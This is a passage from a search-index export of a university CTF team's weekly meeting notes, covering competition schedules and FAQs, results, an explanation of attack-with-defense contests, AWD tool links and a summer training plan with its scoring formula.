<p>https://pan.baidu.com/s/1S4aVRq92IPc8QkCHK3o-sg?pwd=b5jb</p> <p>Some materials about the knowledge challenges.</p> <p>I have questioned the knowledge challenges and the CTF part. According to the response from the sponsor, those 2 events would be held at the same time.</p> <p>The score is 30% knowledge + 70% CTF</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#some-notes","title":"Some notes","text":"<p>\u3010\u95ee\u98981\u30115.22\u672c\u6821\u53c2\u52a0ctf\u6bd4\u8d5b\u7684\u5b66\u751f\u5f53\u5929\u8981\u53c2\u52a0\u5b66\u6821\u7ec4\u7ec7\u7684\u62cd\u6bd5\u4e1a\u7167\u6d3b\u52a8\uff0c\u65f6\u95f4\u4e0a\u51b2\u7a81\u4e86</p> <p>\u7b54\uff1a\u7531\u4e8e\u8fd9\u662f\u5168\u7701\u7edf\u4e00\u6bd4\u8d5b\u65f6\u95f4\uff0c\u8bf7\u8d35\u6821\u81ea\u884c\u534f\u8c03\u3002</p> <p>\u3010\u95ee\u98982\u30115\u670828- 29\u53f7\u8981\u53c2\u4e0e\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\uff0c\u4e0e\u7701\u8d5b\u51b3\u8d5b\u51b2\u7a81</p> <p>\u7b54\uff1a\u7ec4\u59d4\u4f1a\u5df2\u548c\u56e2\u7701\u59d4\u6c9f\u901a\uff0c\u51b3\u8d5b\u5c06\u5ef6\u671f\u4e3e\u884c\uff0c\u8bf7\u5404\u9ad8\u6821\u7559\u610f\u540e\u7eed\u901a\u77e5\u3002</p> <p>\u3010\u95ee\u98983\u3011\u7b2c\u4e00\u9636\u6bb5\u77e5\u8bc6\u7ade\u8d5b\u662f\u6bcf\u4e2a\u961f\u56fa\u5b9a\u9898\u6570\u8fd8\u662f\u6bcf\u4e2a\u961f\u5728\u56fa\u5b9a\u65f6\u95f4\u5185\u7b54\u9898\uff0c\u7b54\u9898\u6570\u76ee\u4e0d\u505a\u9650\u5236\uff1f</p> <p>\u7b54\uff1a\u5b89\u5168\u57fa\u7840\u9898\u548cCTF\u540c\u65f6\u5f00\u542f\uff0c10:30\u5b89\u5168\u57fa\u7840\u9898\u7b54\u9898\u5173\u95ed\uff0c17\uff1a30\u5173\u95edCTF\u7b54\u9898\uff0c\u521d\u8d5b\u7ed3\u675f\uff0c\u521d\u8d5b\u5171\u8ba18\u5c0f\u65f6\uff0c\u5206\u503c\u6309\u5b89\u5168\u57fa\u7840\u5206\u503c30%+70%CTF\u593a\u65d7\uff0c\u6309\u7167\u6210\u7ee9\u9ad8\u4f4e\u53d6\u524d30\u540d\u961f\u4f0d\u8fdb\u5165\u7701\u7ea7\u603b\u51b3\u8d5b\uff0c\u6bcf\u4e2a\u9ad8\u6821\u664b\u7ea7\u961f\u4f0d\u4e0d\u8d85\u8fc72\u4e2a\u3002</p> <p>\uff08\u5b89\u5168\u57fa\u7840\u9898\u548cCTF\u540c\u65f6\u5f00\u542f\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u90e8\u5206\u80fd\u529b\u5f3a\u7684\u5b66\u751f\u6bd4\u5982\u53ea\u82b130\u5206\u949f\u7b54\u5b8c\u7406\u8bba\uff0c\u591a\u4f59\u7684\u65f6\u95f4\u5c31\u53ef\u4ee5\u89e3ctf\uff09</p> <p>\u3010\u95ee\u98984\u3011\u5982\u679c\u662f\u7b2c\u4e00\u79cd\u89c4\u5219\uff0c\u53c8\u662f\u56fa\u5b9a\u9898\u6570\u76f4\u63a5\u7cfb\u7edf\u5206\u914d\u5230\u6bcf\u4e2a\u961f\u5458\uff0c\u8fd8\u662f\u8bf4\u76f4\u63a5\u5168\u90e8\u9898\u76ee\u7ed9\u5230\u6574\u961f\uff0c\u961f\u5185\u81ea\u884c\u5206\u914d? </p> <p>\u7b54\uff1a\u5168\u90e8\u9898\u76ee\u7ed9\u5230\u6574\u961f\uff0c\u6bcf\u4e2a\u961f\u5458\u53ef\u67e5\u770b\uff0c\u53ea\u6709\u961f\u957f\u6709\u6743\u9650\u7b54\u9898\u3002</p> <p>\u3010\u95ee\u98985\u3011\u77e5\u8bc6\u7ade\u8d5b\u662f\u5f00\u5377\u7684\u8fd8\u662f\u4e0d\u4f1a\u53ef\u4ee5\u4e0a\u7f51\u67e5\u7684</p> <p>\u7b54\uff1a\u77e5\u8bc6\u7ade\u8d5b\u662f\u5f00\u5377\uff0c\u53ea\u67091\u4e2a\u5c0f\u65f6\u7b54\u9898\u65f6\u95f4\u3002</p> <p>\u3010\u95ee\u98986\u3011\u5404\u9ad8\u6821\u56e2\u59d4\u662f\u5426\u9700\u8981\u63d0\u4f9b\u573a\u5730\u7ed9\u4e88\u5b66\u751f\u521d\u8d5b\uff08\u8003\u8651\u5230\u7ebf\u4e0a\u65e0\u6444\u50cf\u5934 \u6015\u6307\u5bfc\u8001\u5e08\u5e2e\u5fd9\u505a\u7684\u60c5\u51b5\uff09</p> <p>\u7b54\uff1a\u662f\u5426\u63d0\u4f9b\u573a\u5730\u7531\u5404\u9ad8\u6821\u56e2\u59d4\u81ea\u884c\u51b3\u5b9a\uff0c\u7ebf\u4e0a\u521d\u8d5b\u65e0\u6cd5\u5bf9\u53c2\u8d5b\u961f\u4f0d\u505a\u9898\u8fc7\u7a0b\u8fdb\u884c\u7edd\u5bf9\u7684\u76d1\u63a7\uff0c\u4f46\u662f\u5e73\u53f0\u4f1a\u6709\u53cd\u4f5c\u5f0a\u673a\u5236\uff0c\u4f5c\u5f0a\u7684\u961f\u4f0d\u5c06\u53d6\u6d88\u6210\u7ee9\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5b66\u6821\u6700\u591a\u53ea\u80fd\u67092\u4e2a\u961f\u4f0d\u8fdb\u5165\u51b3\u8d5b\u3002</p> <p>\u3010\u95ee\u98987\u3011\u5404\u9ad8\u6821\u9700\u8981\u63d0\u4f9b\u4ec0\u4e48\u4e1c\u897f\u7ed9\u5230\u5b66\u751f\u6bd4\u8d5b</p> <p>\u7b54\uff1a\u7406\u8bba\u4e0a\u4e0d\u9700\u8981\u63d0\u4f9b\uff0c\u5b66\u751f\u53c2\u52a0\u6bd4\u8d5b\u5373\u53ef</p> <p>\u3010\u95ee\u98988\u3011\u5e73\u53f0\u62a5\u540d\u65e0\u6cd5\u4f7f\u7528\u7279\u6b8a\u5b57\u7b26\uff0c\u9700\u8981\u66f4\u6539\u62a5\u540d\u961f\u4f0d\u540d\u5b57\uff0c\u8fd9\u4e0e\u4e4b\u524d\u662f\u5426\u63d0\u4ea4\u7684Excel\u8868\u51b2\u7a81\u3002</p> <p>\u7b54\uff1a\u4e0d\u51b2\u7a81\uff1b\u540e\u7eed\u7684\u76f8\u5173\u4fe1\u606f\u5747\u4ee5\u7ebf\u4e0a\u62a5\u540d\u5e73\u53f0\u4e3a\u51c6\u3002</p> <p>\u3010\u95ee\u98989\u3011\u767b\u5f55\u6ce8\u518c\u5e73\u53f0\u51fa\u73b0404\u753b\u9762\u6216\u6301\u7eed\u8f6c\u5708</p> <p>\u7b54\uff1a\u9700\u7528\u7535\u8111\u7aef\u767b\u5f55\uff0c\u5982\u679c\u51fa\u73b0\u6d4f\u89c8\u5668\u52a0\u8f7d\u6162\u7684\u60c5\u51b5\uff0c\u5efa\u8bae\u4f7f\u7528Chrome\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee\u3002\u9996\u6b21\u4f7f\u7528\u6211\u4eec\u7684datacon\u5e73\u53f0\uff0c\u8bf7\u5148\u6ce8\u518c---&gt;\u767b\u5f55---&gt;\u8fdb\u5165\u8d5b\u4e8b\u7ec4\u961f\u62a5\u540d---&gt;\u9080\u8bf7\u961f\u53cb---&gt;\u62a5\u540d\u5b8c\u6210\uff0c\u7b49\u5f85\u5f00\u8d5b\u3002</p> <p>\u3010\u95ee\u989810\u3011\u5e73\u53f0\u662f\u5426\u9700\u8981\u961f\u957f\u548c\u961f\u5458\u540c\u65f6\u62a5\u540d\uff1f</p> <p>\u7b54\uff1a\u961f\u53cb\u53ea\u9700\u8981\u6ce8\u518c\u8d26\u53f7\u5c31\u884c\uff0c\u961f\u957f\u7ec4\u961f\u540e\u9080\u8bf7\u961f\u53cb\u3002</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#upcoming-challenges","title":"Upcoming challenges","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#202219-iscc-skip","title":"2022\u5e74\u7b2c19\u5c4a\u4fe1\u606f\u5b89\u5168\u4e0e\u5bf9\u6297\u6280\u672f\u7ade\u8d5b ISCC (skip)","text":"<p>https://iscc.isclab.org.cn/</p> <p>\u4e2a\u4eba\u6311\u6218\u8d5b till May, 25th</p> <p>\u5206\u7ec4\u5bf9\u6297\u8d5b \u4e03\u6708\u4e2d\u65ec</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#_1","title":"\u7b2c\u5341\u4e94\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u8d5b","text":"<p>http://www.ciscn.cn/competition/securityCompetition?compet_id=36</p> <p>\u62a5\u540d\u622a\u6b62\u81f35\u670820\u65e5\uff0c\u521d\u8d5b\u65f6\u95f4\u4e3a5\u670828\u65e5</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#_2","title":"\u7b2c\u516d\u5c4a\u201c\u84dd\u5e3d\u676f\u201d\u5168\u56fd\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b","text":"<p>https://www.qianxin.com/bluehatcup/2022</p> <p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2022-05-06 09:00:00 - 2022-05-23 18:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2022-05-25 09:00:00 - 2022-05-25 17:00:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#hack-a-sat-3-qualifiers-skip","title":"Hack-A-Sat 3 Qualifiers (skip)","text":"<p>https://www.hackasat.com/</p> <p>\u661f\u671f\u516d, 21 \u4e94\u6708 2022, 22:00 CST \u2014 \u661f\u671f\u4e00, 23 \u4e94\u6708 2022, 04:00 CST</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#def-con-ctf-qualifier-2022","title":"DEF CON CTF Qualifier 2022","text":"<p>https://quals.2022.nautilus.institute/</p> <p>\u661f\u671f\u516d, 28 \u4e94\u6708 2022, 08:00 CST \u2014 \u661f\u671f\u4e00, 30 \u4e94\u6708 2022, 08:00 CST</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#2022dasctf-may-skip","title":"2022DASCTF MAY \u51fa\u9898\u4eba\u6311\u6218\u8d5b (skip)","text":"<p>https://buuoj.cn/plugins/ctfd-matches/matches/107</p> <p>2022\u5e745\u670821\u65e510:00-18:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/#note","title":"Note","text":"<ul> <li>[ ] \u672c\u5468\u65e5\uff0822\u65e5\uff09\u8fdb\u884c\u7b2c\u4e8c\u5c4a\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u7ade\u8d5b\u7684\u521d\u8d5b</li> <li>[ ] \u7ade\u8d5b\u592a\u591a\u4e86\uff0c\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u5b89\u6392</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/","title":"CTF Week Meeting 2022-05-26","text":"<ol> <li>The competition result.</li> <li>About the summer vacation schedule.</li> <li>Upcoming events summary.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/#2nd-guangdong-ctf","title":"2nd Guangdong CTF","text":"<p>2 top 50 teams:</p> Team name Rank Writeups HED 9 Submitted MFGI 37 Submitted <p>Removed repetitive teams from the top 36 (3 or more teams of the same university), MFGI's rank is 28.</p> <p>I'm waiting for the notifications of the final round. However, the organizers are still counting the results (till 15:00 Thursday).</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/#summer-schedule","title":"Summer Schedule","text":"<p>During the summer of 2022, we are going to open another training and recruiting plan.</p> <p>The summer schedule would be divided into 2 parts: basic rank and advanced rank. The previous one's goal is to teach some necessary knowledge for the interests and would be easier. The last one's goal is to train for the COMPASS team which would be harder.</p> Basic Advanced Estimated time per week 6 hours 15 hours Knowledge level for interests for competitions Lectures Yes Yes Weekly challenges Optional Yes Leader for training Group discussion Assigned team members Qualification exam free to participate free to participate, +5 points <p>The training schedule would last for 2 months, and then we would have a qualification exam. Around the top 20% of members are admitted to the team.</p> <p>The detailed schedule and the document would be published on a single page (Before the summer vacation).</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/#upcoming-events","title":"Upcoming Events","text":"<p>The page has been updated in 2022 Spring.</p> <p>DEF CON 30</p> <p>https://quals.2022.nautilus.institute/dashboard</p> <p>I have already submitted a team <code>C0MP4SS</code>.</p> <p>Qualifications begin 2022\u5e745\u670828\u65e5 GMT+8 8:00:00 1653696000</p> <p>Qualifications end 2022\u5e745\u670830\u65e5 GMT+8 8:00:00 1653868800</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/#note","title":"Note","text":"<ul> <li>[x] \u672c\u5468\u65e5\uff0822\u65e5\uff09\u8fdb\u884c\u7b2c\u4e8c\u5c4a\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u7ade\u8d5b\u7684\u521d\u8d5b</li> <li>[ ] \u6691\u671f\u8ba1\u5212\u76f8\u5173\u7684\u6587\u6863\u6574\u7406\u4e0e\u60c5\u62a5\u6536\u96c6</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/","title":"CTF Week Meeting 2022-06-03","text":"<ol> <li>2nd Guangdong CTF Final.</li> <li>AWD introduction and the toolkit.</li> <li>Summer schedule.</li> <li>The upcoming training and the competitions.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#2nd-guangdong-ctf-final","title":"2nd Guangdong CTF Final","text":"<p>The competition score of HED is 9th place in the CTF and 80% in the knowledge challenge.</p> <p>HED: 8th rank and qualified for the final round.</p> <p>If you are very close to the final, don't be upset. Try harder and your studies would be paid back.</p> Team Score to final MFGI 0.38 W3r3wo1fki11 10.14 \u732b\u732b\u5212\u6c34\u961f 11.22 <p>You are very talented. 10 points can be a 400 points challenge, keeping learning and you can win very soon.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#awd","title":"AWD","text":"<p>AWD, attack with defense.</p> <p>https://youtu.be/RkaLyji9pNs</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#the-gameserver","title":"The Gameserver","text":"<p>It is provided by the organizers and runs throughout the competition, starting when the network is opened. It periodically stores flags on your Vulnbox using the functionality in the provided services. It then later retrieves these flags, again using existing functionality. The Gameserver does not run exploits! It simply uses the service as intended.</p> <p>Now, why can't the other teams then simply do what the Gameserver does?</p> <p>The Gameserver has more information. Every service is either designed to allow the Gameserver to store a specific token for each flag or generates one and returns it to the Gameserver.</p> <p>The Gameserver uses this token to check periodically that the flag is still there. Whether or not it gets the stored flag using that token, determines your SLA (Service Level Agreement). You mustn't remove or break any legitimate functionality.</p> <p>Some services can have a vulnerability that directly leaks the flag, which will let you retrieve the flag easily. For others, it will require more effort.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#your-vulnbox","title":"Your Vulnbox","text":"<p>The Vulnbox is your running instance of the virtual machine image given to you by the organizers. It contains and runs all the services of the competition and should be reachable at all times. The Gameserver stores its flags here and uses the communication with this machine to decide if your services are working as intended or not. This machine is accessible to everyone on the network, and is the target for all the exploits from other teams.</p> <p>Protecting the flags on this machine is what determines your defense points!</p> <p>You normally have one hour from getting the decryption password of your Vulnbox until the network between teams is opened and everyone can attack each other. Use this time to get the VM running, then start analyzing what's running on it. It has happened that services with vulnerabilities that are easy to find have been exploited as soon as the actual competition starts.</p> <p>For learning how to host the Vulnbox, have a look at Basic Vulnbox Hosting.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#the-other-teams","title":"The other teams","text":"<p>All the other registered teams are connected to the same VPN as you. Their Vulnboxes have known IP addresses, all other machines are off-limits! The other teams will run exploits from their own machines, but the VPN infrastructure will use NAT to obfuscate whether a packet came from the Gameserver or another team.</p> <p>Successfully stealing and submitting flags from the Vulnbox of other teams determines your attack score!</p> <p>If you have played jeopardy CTFs before, you already know flag submission. In this game, however, you'll have to run your exploits periodically, as new flags get stored by the Gameserver every few minutes. So you probably want to script exploits and submit Flags automatically and you don't spend all your time manually exploiting everyone.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#training-and-toolkit-about-awd","title":"Training and toolkit about AWD","text":"<p>We can hold an AWD training and competition this weekend, if you are interested to.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/#note","title":"Note","text":"<ul> <li>[ ] \u6691\u671f\u8ba1\u5212\u76f8\u5173\u7684\u6587\u6863\u6574\u7406\u4e0e\u60c5\u62a5\u6536\u96c6</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/","title":"CTF Week Meeting 2022-06-09","text":"<ol> <li>Skip the training this week.</li> <li>AWD tool list.</li> <li>(Update) Summer schedule</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#schedule-for-this-week","title":"Schedule for this week","text":"<p>Our members are going to have the final exams.</p> <p>The training schedule for this weekend is skipped.</p> <p>Hope you have a good grade in your exams!</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#awd-tool-list","title":"AWD tool list","text":"<p>AoiAWD: https://wiki.compass.college/Tool/AWD/AoiAWD/</p> <p>Auto-AWD: https://wiki.compass.college/Tool/AWD/Auto-AWD/</p> <p>AWD_auto_attack: https://wiki.compass.college/Tool/AWD/AWD_auto_attack/</p> <p>awd-submit-flag: https://wiki.compass.college/Tool/AWD/awd-submit-flag/</p> <p>awd-watchbird: https://wiki.compass.college/Tool/AWD/awd-watchbird/</p> <p>flower: https://wiki.compass.college/Tool/AWD/flower/</p> <p>ShellCat: https://wiki.compass.college/Tool/AWD/ShellCat/</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#summer-schedule","title":"Summer schedule","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#tldr","title":"tl,dr;","text":"<ul> <li>Training time: from June, 19th to August, 14th.</li> <li>Offline training would be held every Sunday from 9 am to 6 pm in 551 Meeting Room, Southern Tower of the Engineering Department.</li> <li>Two tiers: basic level and advanced level.</li> <li>The qualification exam would be on August 13th and 14th.</li> <li>Enjoy your tour of CTF and the infosec.</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#timeline","title":"Timeline","text":"<p>The time schedule would according to the weekly training topics. Every week, we would have a topic to focus on. During the training time, our timeline is set to the following table.</p> Time Topic Introduction Material June, 19th CTF Overview &amp; Fun-oriented challenges. Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf June, 26th Linux, Programming, and Toolkit Introduce how to operate a Linux system using CLI, and install your environment. Learn how to program with Python. Install the toolkit. Linux, Programming, and Toolkit July, 3rd Web Challenges and Databases Ability to learn computer networks and hack websites. Know HTTP &amp; HTTPS in protocol, and tools to capture / modify packets. Web Challenges and Databases.pdf July, 10th Forensics &amp; Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf July, 17th Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition of security and attacks on modern cryptography. Cryptography.pptx July, 24th Assembly Language Learn about some CISC knowledge. Use x86_64 as example to do assembly. Some reverse engineering skills are involved. Reverse.pdf July, 31th Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Operating Systems.pptx August, 7th Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf August, 13th Report and Summary Before the final exam, we would have a report week to share your learning and conclusion on the CTF. TBA August, 14th Exam Brand new challenges to solve this year, and winners would be qualified to the team. TBA"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#exam-and-the-score","title":"Exam and the score","text":"<p>The training schedule isn't a course or something you need to rat race to get an A-level score. But, I think taking some grades can be feedback on your learning.</p> <p>How to join the compass team? Sometimes, joining the CTF competitions can be done by oneself, but usually, we need teamwork to get a better grade in the competitions. You don't want your teammate to be a newbie, right? The exam and the score are used to make sure that every member is great.</p> <p>Thus, if you find anything that is non-reasonable in our score system, please write an email to me. I would appreciate having your advice.</p> <p>The scoring system won't have a cap, you can get as many points if you want. However, I don't like the rat race. So, every category would have a percentage in the result.</p> <p>The final score formula is: <code>score = weight * sum(percent * log(2, score))</code></p> <p>The categories involves,</p> <ul> <li>Evaluation of the weekly challenges, and competitions: 30%.</li> <li>Remark from the team members: 10%.</li> <li>The sharing and the report score: 15%.</li> <li>The final exam: 100%.</li> </ul> <p>The weight would be according to your grade. A freshman in the university is less experienced compared with the senior students, but from future learning, a freshman can have more time to improve. The weight is in order to balance the grades.</p> <ul> <li>Freshman (grade 1): +6%.</li> <li>Sophomore (grade 2): +4%.</li> <li>Junior (grade 3): +2%.</li> </ul> <p>This is summer training, and we won't have any senior members (they are already graduated).</p> <p>For example, if you got 3127 in the challenges and competitions, 155 in the remarks, 229 in the report, and 1625 in the final exam. You are a freshman in the university and just finished your first year. The total score would be: <code>1.06 * (0.3 * 11.610563503925041 + 0.1 * 7.2761244052742375 + 0.15 * 7.839203788096944 + 1 * 10.66622400280318) = 17.016059226486018</code>.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_1","title":"\u5f3a\u56fd\u676f","text":"<p>https://www.qiangguobei.org.cn/</p> <p>https://www.qiangguobei.org.cn/index/match/detail/id/12.html</p> <p>Register: starts from 2022-06-08</p> <p>Online Jeopardy: 2022-07-06</p> <p>Online region challenges: 2022-07-24 (TBA)</p> <p>Offline final: 2022-08-31 (TBA)</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_2","title":"\u7f51\u9f0e\u676f","text":"<p>https://www.wangdingcup.com/</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_3","title":"\u5b98\u65b9\u8d44\u683c\u8d5b\u7ebf\u4e0a\u62a5\u540d","text":"<p>6\u67082\u65e510:00-7\u670827\u65e520:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_4","title":"\u5b98\u65b9\u8d44\u683c\u8d5b\uff08\u9752\u9f99\u7ec4\uff09","text":"<p>\u53c2\u8d5b\u884c\u4e1a\uff1a\u9ad8\u7b49\u9662\u6821\uff0c\u804c\u4e1a\u9662\u6821\uff0c\u65e0\u5355\u4f4d\u6302\u9760\u7684\u793e\u4f1a\u53c2\u8d5b\u961f\u4f0d</p> <p>8\u67084\u65e59:00-17:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_5","title":"\u5b98\u65b9\u8d44\u683c\u8d5b\uff08\u7384\u6b66\u7ec4\uff09","text":"<p>\u53c2\u8d5b\u884c\u4e1a\uff1a\u79d1\u7814\u673a\u6784\u3001\u79d1\u6280\u4f01\u4e1a\u3001\u4e92\u8054\u7f51\u4f01\u4e1a\u3001\u7f51\u5b89\u4f01\u4e1a</p> <p>8\u67089\u65e59:00-17:00</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_6","title":"\u534a\u51b3\u8d5b","text":"<p>8\u670828\u65e5</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#_7","title":"\u603b\u51b3\u8d5b","text":"<p>8\u670829\u65e5</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/#note","title":"Note","text":"<ul> <li>[x] \u6691\u671f\u8ba1\u5212\u76f8\u5173\u7684\u6587\u6863\u6574\u7406\u4e0e\u60c5\u62a5\u6536\u96c6</li> <li>[ ] \u4e0b\u5b66\u671fCS315\u7684\u5185\u5bb9\u4fee\u6539</li> <li>[ ] \u5e74\u5e95\u4f1a\u8bae\u6709\u5173\u8ba1\u7b97\u673a\u5b89\u5168\u8bfe\u7a0b&amp;CTF\u76f8\u5173\u7684\u7ecf\u9a8c\u603b\u7ed3</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/","title":"CTF Week Meeting 2022-06-16","text":"<ol> <li>Upgrades in CTFtime rank.</li> <li>Introduction to this weekend.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#ctftime-rank","title":"CTFtime rank","text":"<p>Just got HSCTF9 #79, and the CTFtime team rank goes to the #28 in China.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#participated-in-ctf-events","title":"Participated in CTF events","text":"<ul> <li>2022</li> <li>2021</li> </ul> <p>Overall rating place: 473 with 41.261 pts in 2022</p> <p>Country place: 28</p> Place Event CTF points Rating points 79 HSCTF 9 3351.0000 9.690 104 1337UP LIVE CTF 1629.0000 3.547 31 Engineer CTF 5229.0000 12.184 27 Codegate CTF 2022 Preliminary 1802.0000 5.842 194 DefCamp CTF 21-22 Online 100.0000 1.061 159 Real World CTF 4th 32.0000 0.748 140 KnightCTF 2022 2425.0000 8.190"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#introduction-to-this-weekend","title":"Introduction to this weekend","text":"<p>We are going to have our first summer training!</p> <p>Training time: June, 19th from 9:00 am to 18:00 pm</p> <p>Location: 551 Meeting Room, Southern Tower of the Engineering Department &amp; Online</p> <p>Topic: CTF Overview &amp; Fun-oriented challenges.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#what-we-are-going-to-do","title":"What we are going to do","text":"<p>This week, we would register all members who want to participate in our summer schedule. I'm going to share something interesting about the CTFs and InfoSec. It's also a great time to meet some team members.</p> <p>In the morning:</p> <p>Discuss the schedule plans. Choose your learning goal and find the appropriate level. We would talk about some fun parts in the InfoSec also.</p> <p>In the afternoon:</p> <p>Learn about the different types of the CTF, and which kind of events you are interested in. Let's work on some teamwork and solve the challenges. Hope you enjoy the travel to InfoSec.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#what-you-should-take","title":"What you should take","text":"<ul> <li>A fully functional laptop (if you want to bring a desktop, it's also fine). Don't forget to take the charger.</li> <li> <p>An earphone. We are going to listen to some audio.</p> </li> <li> <p>Your teammate, classmate, and whoever you want to work with.</p> </li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#standcon-ctf-2022","title":"STANDCON CTF 2022","text":"<p>\u661f\u671f\u516d, 18 \u516d\u6708 2022, 10:00 CST \u2014 \u661f\u671f\u65e5, 19 \u516d\u6708 2022, 10:00 CST</p> <p>https://standcon.n0h4ts.com/</p> <p>STANDCON is an annual flagship Cybersecurity Conference and Capture the Flag Competition.</p> <p>organized by N0H4TS, Division Zero. This year, STANDCON will be held from 17 - 19 June 2022.</p> <p>virtually in Singapore, via Gather Town and Discord.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#typhooncon-ctf-2022","title":"TyphoonCon CTF 2022","text":"<p>\u661f\u671f\u4e00, 20 \u516d\u6708 2022, 17:00 CST \u2014 \u661f\u671f\u4e94, 24 \u516d\u6708 2022, 17:00 CST</p> <p>https://typhooncon.ctfd.io/</p> <p>TyphoonCon conference and workshop was founded in 2018 by SSD Secure Disclosure. As part of TyphoonCon, we will be hosting an on site and online CTF with specially crafted challenges alongside fantastic prizes.</p> <p>The event will be running from Monday, June 20th to Friday, June 24th, 2022, at 12 PM KST.</p> <p>Registration is now open at https://typhooncon.ctfd.io/.</p> <p>20-24 June  2022, Seoul, South Korea.</p> <p>All Offensive Security Conference.</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#bsidestlv-2022-ctf","title":"BSidesTLV 2022 CTF","text":"<p>\u661f\u671f\u4e00, 27 \u516d\u6708 2022, 14:00 CST \u2014 \u661f\u671f\u4e09, 29 \u516d\u6708 2022, 14:00 CST</p> <p>https://bsidestlv.com/ctf/2022/</p> <p>BSidesTLV is one of Israel's leading cyber conferences for hackers and security researchers - also hosting the annual Capture The Flag (CTF) competition!</p> <p>Thank you for your interest in attending BSidesTLV 2022!</p> <p>Due to overwhelming demand, we are temporarily pausing new registrations for our 